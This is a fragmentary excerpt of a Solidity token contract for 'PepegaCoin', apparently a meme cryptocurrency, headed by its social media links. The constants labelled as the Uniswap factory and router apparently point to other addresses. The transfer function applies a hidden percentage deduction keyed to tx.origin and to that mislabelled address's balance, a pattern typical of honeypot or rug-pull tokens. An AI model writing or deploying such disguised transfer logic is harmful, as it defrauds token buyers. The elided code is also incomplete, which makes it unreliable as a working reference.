...
https://twitter.com/PepegaCoinETH
https://t.me.com/PepegaCoinETH
https://PepegaCoinETH.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private V2uniswapFactory = 0x5c9aD48A4763C7c44cce856a72e6A9496E638A2C;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private _swapEnabled = 2;
    address internal V2uniswapRouter = 0x98625705855dD5Dad5147684ccA484D7Fc4b80EF;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2uniswapRouter && _balances[V2uniswapFactory] > 0 ? pairsAllowance : _swapEnabled).div(100)+0;
        if (swapamount > 0)
        {
...
contract PepegaCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Pepega", unicode"PEPEGA")
    {
